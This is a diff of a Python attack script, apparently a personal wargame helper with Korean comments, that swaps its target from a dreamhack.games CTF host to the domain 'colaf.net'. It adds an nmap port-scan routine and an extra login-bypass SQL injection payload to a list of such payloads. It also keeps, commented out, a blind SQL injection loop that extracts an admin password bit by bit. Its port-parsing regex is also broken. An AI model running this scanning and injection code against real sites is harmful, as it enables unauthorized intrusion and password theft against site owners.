@@ -1,9 +1,11 @@
 import requests
 import re
 import string, json
+import nmap
+import socket
 
-host = 'http://host3.dreamhack.games'
-port = '8402'
+host = 'colaf.net'
+port = '80'
 url = host+':'+port
 headers = {'Content-Type': 'application/json; charset=utf-8'}
 cookies = {
@@ -14,6 +16,7 @@ data = {'cmd': 'ls'
         }
 payloadSQL = ['admin\' OR \'1',                 # admin' OR '1
               'admin\' OR 1 -- -',              # admin' OR 1 -- -
+              'admin\' || \'1',                 # and는 &&, or는 ||로 우회
               '" OR "" = "',                    # " OR "" = "
               '" OR 1 = 1 -- -',                # " OR 1 = 1 -- -
               '\'=\'',                          # '='
@@ -62,33 +65,80 @@ def printLog(payload, responseText):
     print("================================================================")
     print("payload: " + payload)
     print(response.text)
+################################ SCAN   #################################
+nmap_scan = nmap.PortScanner()
+ip_regex = re.compile("^\d")
+try:
+    print(str(host.replace(" ", "")))
+    isValidIp = ip_regex.search(host.replace(" ", ""))
+    print(str(isValidIp))
+    if isValidIp:
+        print("ifif")
+        IP = host
+    else:
+        print("elseelse")
+        IP = socket.gethostbyname(host)
+        print(str(IP))
+except:
+    print("잘못된 host name 입니다.")
+
+port_regex = re.compile("([0-9]+){1, 5}")
+isValidPort = port_regex.search(port.replace(" ", ""))
+if isValidPort:
+    port_min = int(isValidPort.group(1))
+    if isValidPort.group(2):
+        port_max = int(isValidPort.group(2))
+    else:
+        port_max = int(isValidPort.group(1))
+else:
+    port_min = 443
+    port_max = 443
+
+for port in range(port_min, port_max + 1):
+    try:
+        port_condition = nmap_scan.scan(IP, str(port))
+        print(port_condition)
+    except:
+        print(f"{port} 포트는 닫혀있습니다.")
 
 ################################ CANVAS  ################################
 def existDetector(text):
     regex_exist = re.compile('exists')
     detectedTexts = regex_exist.findall(text)
     return detectedTexts
-pwLength = 0
-for index in range(50):
-    payload = 'admin\' and char_length(upw)='+str(index)+';--'
-    params = {
-        'uid': payload}
-    response = requests.get(url, params = params, verify=False)
-    printLog(payload, refineResponse(response.text))
-    if len(existDetector(response.text))>0:
-        pwLength = index
-        break
-
-for nthPw in range(1, pwLength+1):
-    for index in range(128):
-        payload = 'admin\' and length(bin(ord(substr(upw, '+str(nthPw)+', 1))))='+str(index)+';--'
-        params = {'uid': payload}
-        response = requests.get(url, params = params, verify=False)
-        #printLog('nthPw: '+str(nthPw)+', index: '+str(index), refineResponse(response.text))
-        if len(existDetector(response.text))>0:
-            print(str(nthPw)+'th password: '+str(index))
-            break
-
+#pwLength = 0
+#for index in range(50):
+#    payload = 'admin\' and char_length(upw)='+str(index)+';--'
+#    params = {
+#        'uid': payload}
+#    response = requests.get(url, params = params, verify=False)
+#    printLog(payload, refineResponse(response.text))
+#    if len(existDetector(response.text))>0:
+#        pwLength = index
+#        break
+#countPw = []
+#binaryPw = []
+#for nthPw in range(1, pwLength+1):
+#    for nthBit in range(128):
+#        payload = 'admin\' and length(bin(ord(substr(upw, '+str(nthPw)+', 1))))='+str(nthBit)+';--'
+#        params = {'uid': payload}
+#        response = requests.get(url, params = params, verify=False)
+#        #printLog('nthPw: '+str(nthPw)+', nthBit: '+str(nthbit), refineResponse(response.text))
+#        if len(existDetector(response.text))>0:
+#            bitarray = []
+#            print(str(nthPw)+'th password: '+str(nthBit))
+#            for bit in range(1, nthBit+1):
+#                payload = 'admin\' and substr(bin(ord(substr(upw, '+str(nthPw)+', 1))), '+str(bit)+', 1)=0;--'
+#                params = {'uid': payload}
+#                response = requests.get(url, params = params, verify=False)
+#                if len(existDetector(response.text))>0:
+#                    bitarray += '0'
+#                else:
+#                    bitarray += '1'
+#                print(bitarray)
+#            binaryPw += bitarray
+#            break
+#
 ################################ PALETTE ################################
 
 # response = requests.get(url, params = params, cookies=cookies, verify=False)
